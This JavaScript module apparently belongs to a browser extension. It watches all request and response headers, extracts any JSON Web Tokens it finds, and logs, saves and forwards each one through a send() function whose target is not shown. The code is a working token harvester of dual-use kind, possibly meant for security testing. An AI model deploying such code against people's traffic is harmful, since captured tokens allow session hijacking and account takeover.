import { save, findJWT, send } from './utilities'

const processHeader = (req, name, match) => {
    console.log('JWT FOUND', req.url, name, match)
    const data = [req.url, 'H', name, match]
    save(data)
    send(data)
}

const onHeaderHandler = (req, headers) => {
    headers.forEach(header => {
        const match = findJWT(header.value)
        if (match !== null) {
            processHeader(req, header.name, match)
        }
    })
}

const onSendHeadersHandler = req => {
    if (void 0 !== req.requestHeaders) {
        onHeaderHandler(req, req.requestHeaders)
    }
}

const onHeadersReceivedHandler = req => {
    if (void 0 !== req.responseHeaders) {
        onHeaderHandler(req, req.responseHeaders)
    }
}

export { onSendHeadersHandler, onHeadersReceivedHandler }